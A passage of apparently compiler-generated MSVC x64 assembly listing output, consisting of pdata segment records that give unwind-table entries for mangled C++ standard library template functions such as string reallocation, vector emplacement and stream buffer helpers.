$pdata$?_Pnavail@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IEBA_JXZ DD imagerel $LN5
	DD	imagerel $LN5+56
	DD	imagerel $unwind$?_Pnavail@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IEBA_JXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$max@_K@std@@YAAEB_KAEB_K0@Z DD imagerel $LN5
	DD	imagerel $LN5+71
	DD	imagerel $unwind$??$max@_K@std@@YAAEB_KAEB_K0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z DD imagerel $LN4
	DD	imagerel $LN4+61
	DD	imagerel $unwind$??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_b986da8d428e4af07c64af60eec09b61>@@QEBA@QEADQEBD_K22D@Z DD imagerel $LN3
	DD	imagerel $LN3+164
	DD	imagerel $unwind$??R<lambda_b986da8d428e4af07c64af60eec09b61>@@QEBA@QEADQEBD_K22D@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Reallocate_grow_by@V<lambda_b986da8d428e4af07c64af60eec09b61>@@_K_KD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_b986da8d428e4af07c64af60eec09b61>@@_K2D@Z DD imagerel $LN6
	DD	imagerel $LN6+497
	DD	imagerel $unwind$??$_Reallocate_grow_by@V<lambda_b986da8d428e4af07c64af60eec09b61>@@_K_KD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_b986da8d428e4af07c64af60eec09b61>@@_K2D@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_e1befb086ad3257e3f042a63030725f7>@@QEBA@QEADQEBD_K2D@Z DD imagerel $LN3
	DD	imagerel $LN3+129
	DD	imagerel $unwind$??R<lambda_e1befb086ad3257e3f042a63030725f7>@@QEBA@QEADQEBD_K2D@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Reallocate_grow_by@V<lambda_e1befb086ad3257e3f042a63030725f7>@@_KD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_e1befb086ad3257e3f042a63030725f7>@@_KD@Z DD imagerel $LN6
	DD	imagerel $LN6+458
	DD	imagerel $unwind$??$_Reallocate_grow_by@V<lambda_e1befb086ad3257e3f042a63030725f7>@@_KD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_e1befb086ad3257e3f042a63030725f7>@@_KD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Pocma@V?$allocator@D@std@@@std@@YAXAEAV?$allocator@D@0@0@Z DD imagerel $LN3
	DD	imagerel $LN3+29
	DD	imagerel $unwind$??$_Pocma@V?$allocator@D@std@@@std@@YAXAEAV?$allocator@D@0@0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$min@_K@std@@YAAEB_KAEB_K0@Z DD imagerel $LN5
	DD	imagerel $LN5+71
	DD	imagerel $unwind$??$min@_K@std@@YAAEB_KAEB_K0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R?$default_delete@V_Facet_base@std@@@std@@QEBAXPEAV_Facet_base@1@@Z DD imagerel $LN5
	DD	imagerel $LN5+73
	DD	imagerel $unwind$??R?$default_delete@V_Facet_base@std@@@std@@QEBAXPEAV_Facet_base@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAA@XZ DD imagerel $LN4
	DD	imagerel $LN4+54
	DD	imagerel $unwind$??1?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?release@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAAPEAV_Facet_base@2@XZ DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$?release@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAAPEAV_Facet_base@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?0U?$default_delete@V_Facet_base@std@@@std@@$0A@@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAA@PEAV_Facet_base@1@@Z DD imagerel $LN3
	DD	imagerel $LN3+47
	DD	imagerel $unwind$??$?0U?$default_delete@V_Facet_base@std@@@std@@$0A@@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAA@PEAV_Facet_base@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0_Sentry_base@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z DD imagerel $LN4
	DD	imagerel $LN4+110
	DD	imagerel $unwind$??0_Sentry_base@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1_Sentry_base@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@XZ DD imagerel $LN4
	DD	imagerel $LN4+88
	DD	imagerel $unwind$??1_Sentry_base@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z DD imagerel $LN7
	DD	imagerel $LN7+205
	DD	imagerel $unwind$??0sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???0sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z@4HA DD imagerel ?dtor$0@?0???0sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z@4HA
	DD	imagerel ?dtor$0@?0???0sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z@4HA+24
	DD	imagerel $unwind$?dtor$0@?0???0sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@AEAV12@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@XZ DD imagerel $LN6
	DD	imagerel $LN6+80
	DD	imagerel $unwind$??1sentry@?$basic_ostream@_WU?$char_traits@_W@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$use_facet@V?$ctype@_W@std@@@std@@YAAEBV?$ctype@_W@0@AEBVlocale@0@@Z DD imagerel $LN11
	DD	imagerel $LN11+257
	DD	imagerel $unwind$??$use_facet@V?$ctype@_W@std@@@std@@YAAEBV?$ctype@_W@0@AEBVlocale@0@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???$use_facet@V?$ctype@_W@std@@@std@@YAAEBV?$ctype@_W@0@AEBVlocale@0@@Z@4HA DD imagerel ?dtor$0@?0???$use_facet@V?$ctype@_W@std@@@std@@YAAEBV?$ctype@_W@0@AEBVlocale@0@@Z@4HA
	DD	imagerel ?dtor$0@?0???$use_facet@V?$ctype@_W@std@@@std@@YAAEBV?$ctype@_W@0@AEBVlocale@0@@Z@4HA+24
	DD	imagerel $unwind$?dtor$0@?0???$use_facet@V?$ctype@_W@std@@@std@@YAAEBV?$ctype@_W@0@AEBVlocale@0@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$1@?0???$use_facet@V?$ctype@_W@std@@@std@@YAAEBV?$ctype@_W@0@AEBVlocale@0@@Z@4HA DD imagerel ?dtor$1@?0???$use_facet@V?$ctype@_W@std@@@std@@YAAEBV?$ctype@_W@0@AEBVlocale@0@@Z@4HA
	DD	imagerel ?dtor$1@?0???$use_facet@V?$ctype@_W@std@@@std@@YAAEBV?$ctype@_W@0@AEBVlocale@0@@Z@4HA+24
	DD	imagerel $unwind$?dtor$1@?0???$use_facet@V?$ctype@_W@std@@@std@@YAAEBV?$ctype@_W@0@AEBVlocale@0@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pubsync@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QEAAHXZ DD imagerel $LN3
	DD	imagerel $LN3+30
	DD	imagerel $unwind$?pubsync@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QEAAHXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?sputc@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QEAAG_W@Z DD imagerel $LN5
	DD	imagerel $LN5+128
	DD	imagerel $unwind$?sputc@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QEAAG_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?sputn@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QEAA_JPEB_W_J@Z DD imagerel $LN3
	DD	imagerel $LN3+50
	DD	imagerel $unwind$?sputn@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@QEAA_JPEB_W_J@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Pninc@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@IEAAPEA_WXZ DD imagerel $LN3
	DD	imagerel $LN3+86
	DD	imagerel $unwind$?_Pninc@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@IEAAPEA_WXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Pnavail@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@IEBA_JXZ DD imagerel $LN5
	DD	imagerel $LN5+56
	DD	imagerel $unwind$?_Pnavail@?$basic_streambuf@_WU?$char_traits@_W@std@@@std@@IEBA_JXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z DD imagerel $LN26
	DD	imagerel $LN26+906
	DD	imagerel $unwind$??$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z@4HA DD imagerel ?dtor$0@?0???$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z@4HA
	DD	imagerel ?dtor$0@?0???$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z@4HA+24
	DD	imagerel $unwind$?dtor$0@?0???$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?catch$1@?0???$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z@4HA DD imagerel ?catch$1@?0???$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z@4HA
	DD	imagerel ?catch$1@?0???$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z@4HA+71
	DD	imagerel $unwind$?catch$1@?0???$_Insert_string@_WU?$char_traits@_W@std@@_K@std@@YAAEAV?$basic_ostream@_WU?$char_traits@_W@std@@@0@AEAV10@QEB_W_K@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?0AEBV?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@AEBV?$allocator@_W@1@@Z DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$??$?0AEBV?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@AEBV?$allocator@_W@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Get_unwrapped@AEAV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@@std@@YA?A_TAEAV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@0@@Z DD imagerel $LN3
	DD	imagerel $LN3+24
	DD	imagerel $unwind$??$_Get_unwrapped@AEAV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@@std@@YA?A_TAEAV?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@0@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Construct@$00PEA_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEA_W_K@Z DD imagerel $LN7
	DD	imagerel $LN7+449
	DD	imagerel $unwind$??$_Construct@$00PEA_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEA_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Emplace_back_with_unused_capacity@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEA_WAEB_W@Z DD imagerel $LN3
	DD	imagerel $LN3+133
	DD	imagerel $unwind$??$_Emplace_back_with_unused_capacity@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEA_WAEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Emplace_reallocate@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_WAEB_W@Z DD imagerel $LN13
	DD	imagerel $LN13+511
	DD	imagerel $unwind$??$_Emplace_reallocate@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_WAEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?catch$0@?0???$_Emplace_reallocate@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_WAEB_W@Z@4HA DD imagerel ?catch$0@?0???$_Emplace_reallocate@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_WAEB_W@Z@4HA
	DD	imagerel ?catch$0@?0???$_Emplace_reallocate@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_WAEB_W@Z@4HA+71
	DD	imagerel $unwind$?catch$0@?0???$_Emplace_reallocate@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAPEA_WQEA_WAEB_W@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Emplace_back_with_unused_capacity@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAAEAEAEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+132
	DD	imagerel $unwind$??$_Emplace_back_with_unused_capacity@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAAEAEAEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Emplace_reallocate@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAPEAEQEAEAEBE@Z DD imagerel $LN13
	DD	imagerel $LN13+511
	DD	imagerel $unwind$??$_Emplace_reallocate@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAPEAEQEAEAEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?catch$0@?0???$_Emplace_reallocate@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAPEAEQEAEAEBE@Z@4HA DD imagerel ?catch$0@?0???$_Emplace_reallocate@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAPEAEQEAEAEBE@Z@4HA
	DD	imagerel ?catch$0@?0???$_Emplace_reallocate@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAPEAEQEAEAEBE@Z@4HA+71
	DD	imagerel $unwind$?catch$0@?0???$_Emplace_reallocate@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAPEAEQEAEAEBE@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Emplace_back_with_unused_capacity@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAAEADAEBD@Z DD imagerel $LN3
	DD	imagerel $LN3+132
	DD	imagerel $unwind$??$_Emplace_back_with_unused_capacity@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAAEADAEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Emplace_reallocate@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAPEADQEADAEBD@Z DD imagerel $LN13
	DD	imagerel $LN13+511
	DD	imagerel $unwind$??$_Emplace_reallocate@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAPEADQEADAEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?catch$0@?0???$_Emplace_reallocate@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAPEADQEADAEBD@Z@4HA DD imagerel ?catch$0@?0???$_Emplace_reallocate@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAPEADQEADAEBD@Z@4HA
	DD	imagerel ?catch$0@?0???$_Emplace_reallocate@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAPEADQEADAEBD@Z@4HA+71
	DD	imagerel $unwind$?catch$0@?0???$_Emplace_reallocate@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAPEADQEADAEBD@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z DD imagerel $LN3
	DD	imagerel $LN3+76
	DD	imagerel $unwind$??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Construct_in_place@PEADAEBQEAD@std@@YAXAEAPEADAEBQEAD@Z DD imagerel $LN3
	DD	imagerel $LN3+76
	DD	imagerel $unwind$??$_Construct_in_place@PEADAEBQEAD@std@@YAXAEAPEADAEBQEAD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$exchange@PEAV_Facet_base@std@@$$T@std@@YAPEAV_Facet_base@0@AEAPEAV10@$$QEA$$T@Z DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$??$exchange@PEAV_Facet_base@std@@$$T@std@@YAPEAV_Facet_base@0@AEAPEAV10@$$QEA$$T@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z DD imagerel $LN5
	DD	imagerel $LN5+59
	DD	imagerel $unwind$??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Get_size_of_n@$01@std@@YA_K_K@Z DD imagerel $LN4
	DD	imagerel $LN4+64
	DD	imagerel $unwind$??$_Get_size_of_n@$01@std@@YA_K_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Get_size_of_n@$00@std@@YA_K_K@Z DD imagerel $LN3
	DD	imagerel $LN3+23
	DD	imagerel $unwind$??$_Get_size_of_n@$00@std@@YA_K_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$_Tidy_guard@V?$numpunct@D@std@@@std@@QEAA@XZ DD imagerel $LN4
	DD	imagerel $LN4+38
	DD	imagerel $unwind$??1?$_Tidy_guard@V?$numpunct@D@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Maklocstr@D@std@@YAPEADPEBDPEADAEBU_Cvtvec@@@Z DD imagerel $LN7
	DD	imagerel $LN7+156
	DD	imagerel $unwind$??$_Maklocstr@D@std@@YAPEADPEBDPEADAEBU_Cvtvec@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Getvals@D@?$numpunct@D@std@@IEAAXDPEBUlconv@@U_Cvtvec@@@Z DD imagerel $LN3
	DD	imagerel $LN3+111
	DD	imagerel $unwind$??$_Getvals@D@?$numpunct@D@std@@IEAAXDPEBUlconv@@U_Cvtvec@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??__E?id@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@2V0locale@2@A@@YAXXZ DD imagerel ??__E?id@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@2V0locale@2@A@@YAXXZ
	DD	imagerel ??__E?id@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@2V0locale@2@A@@YAXXZ+23
	DD	imagerel $unwind$??__E?id@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@2V0locale@2@A@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??__E?id@?$numpunct@D@std@@2V0locale@2@A@@YAXXZ DD imagerel ??__E?id@?$numpunct@D@std@@2V0locale@2@A@@YAXXZ
	DD	imagerel ??__E?id@?$numpunct@D@std@@2V0locale@2@A@@YAXXZ+23
	DD	imagerel $unwind$??__E?id@?$numpunct@D@std@@2V0locale@2@A@@YAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?0AEAPEAV_Facet_base@std@@@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PEAV_Facet_base@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@AEAPEAV_Facet_base@1@@Z DD imagerel $LN3
	DD	imagerel $LN3+49
	DD	imagerel $unwind$??$?0AEAPEAV_Facet_base@std@@@?$_Compressed_pair@U?$default_delete@V_Facet_base@std@@@std@@PEAV_Facet_base@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@AEAPEAV_Facet_base@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Construct_in_place@_WAEB_W@std@@YAXAEA_WAEB_W@Z DD imagerel $LN3
	DD	imagerel $LN3+76
	DD	imagerel $unwind$??$_Construct_in_place@_WAEB_W@std@@YAXAEA_WAEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$construct@_WAEB_W@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SAXAEAV?$allocator@_W@1@QEA_WAEB_W@Z DD imagerel $LN3
	DD	imagerel $LN3+73
	DD	imagerel $unwind$??$construct@_WAEB_W@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SAXAEAV?$allocator@_W@1@QEA_WAEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Uninitialized_move@PEA_WV?$allocator@_W@std@@@std@@YAPEA_WQEA_W0PEA_WAEAV?$allocator@_W@0@@Z DD imagerel $LN7
	DD	imagerel $LN7+220
	DD	imagerel $unwind$??$_Uninitialized_move@PEA_WV?$allocator@_W@std@@@std@@YAPEA_WQEA_W0PEA_WAEAV?$allocator@_W@0@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???$_Uninitialized_move@PEA_WV?$allocator@_W@std@@@std@@YAPEA_WQEA_W0PEA_WAEAV?$allocator@_W@0@@Z@4HA DD imagerel ?dtor$0@?0???$_Uninitialized_move@PEA_WV?$allocator@_W@std@@@std@@YAPEA_WQEA_W0PEA_WAEAV?$allocator@_W@0@@Z@4HA
	DD	imagerel ?dtor$0@?0???$_Uninitialized_move@PEA_WV?$allocator@_W@std@@@std@@YAPEA_WQEA_W0PEA_WAEAV?$allocator@_W@0@@Z@4HA+24
	DD	imagerel $unwind$?dtor$0@?0???$_Uninitialized_move@PEA_WV?$allocator@_W@std@@@std@@YAPEA_WQEA_W0PEA_WAEAV?$allocator@_W@0@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Construct_in_place@EAEBE@std@@YAXAEAEAEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+75
	DD	imagerel $unwind$??$_Construct_in_place@EAEBE@std@@YAXAEAEAEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$construct@EAEBE@?$_Default_allocator_traits@V?$allocator@E@std@@@std@@SAXAEAV?$allocator@E@1@QEAEAEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+72
	DD	imagerel $unwind$??$construct@EAEBE@?$_Default_allocator_traits@V?$allocator@E@std@@@std@@SAXAEAV?$allocator@E@1@QEAEAEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Uninitialized_move@PEAEV?$allocator@E@std@@@std@@YAPEAEQEAE0PEAEAEAV?$allocator@E@0@@Z DD imagerel $LN7
	DD	imagerel $LN7+218
	DD	imagerel $unwind$??$_Uninitialized_move@PEAEV?$allocator@E@std@@@std@@YAPEAEQEAE0PEAEAEAV?$allocator@E@0@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???$_Uninitialized_move@PEAEV?$allocator@E@std@@@std@@YAPEAEQEAE0PEAEAEAV?$allocator@E@0@@Z@4HA DD imagerel ?dtor$0@?0???$_Uninitialized_move@PEAEV?$allocator@E@std@@@std@@YAPEAEQEAE0PEAEAEAV?$allocator@E@0@@Z@4HA
	DD	imagerel ?dtor$0@?0???$_Uninitialized_move@PEAEV?$allocator@E@std@@@std@@YAPEAEQEAE0PEAEAEAV?$allocator@E@0@@Z@4HA+24
	DD	imagerel $unwind$?dtor$0@?0???$_Uninitialized_move@PEAEV?$allocator@E@std@@@std@@YAPEAEQEAE0PEAEAEAV?$allocator@E@0@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Construct_in_place@DAEBD@std@@YAXAEADAEBD@Z DD imagerel $LN3
	DD	imagerel $LN3+75
	DD	imagerel $unwind$??$_Construct_in_place@DAEBD@std@@YAXAEADAEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$construct@DAEBD@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SAXAEAV?$allocator@D@1@QEADAEBD@Z DD imagerel $LN3
	DD	imagerel $LN3+72
	DD	imagerel $unwind$??$construct@DAEBD@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SAXAEAV?$allocator@D@1@QEADAEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Uninitialized_move@PEADV?$allocator@D@std@@@std@@YAPEADQEAD0PEADAEAV?$allocator@D@0@@Z DD imagerel $LN7
	DD	imagerel $LN7+218
	DD	imagerel $unwind$??$_Uninitialized_move@PEADV?$allocator@D@std@@@std@@YAPEADQEAD0PEADAEAV?$allocator@D@0@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???$_Uninitialized_move@PEADV?$allocator@D@std@@@std@@YAPEADQEAD0PEADAEAV?$allocator@D@0@@Z@4HA DD imagerel ?dtor$0@?0???$_Uninitialized_move@PEADV?$allocator@D@std@@@std@@YAPEADQEAD0PEADAEAV?$allocator@D@0@@Z@4HA
	DD	imagerel ?dtor$0@?0???$_Uninitialized_move@PEADV?$allocator@D@std@@@std@@YAPEADQEAD0PEADAEAV?$allocator@D@0@@Z@4HA+24
	DD	imagerel $unwind$?dtor$0@?0???$_Uninitialized_move@PEADV?$allocator@D@std@@@std@@YAPEADQEAD0PEADAEAV?$allocator@D@0@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z DD imagerel $LN12
	DD	imagerel $LN12+133
	DD	imagerel $unwind$??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Copy_memmove@PEA_WPEA_W@std@@YAPEA_WPEA_W00@Z DD imagerel $LN3
	DD	imagerel $LN3+159
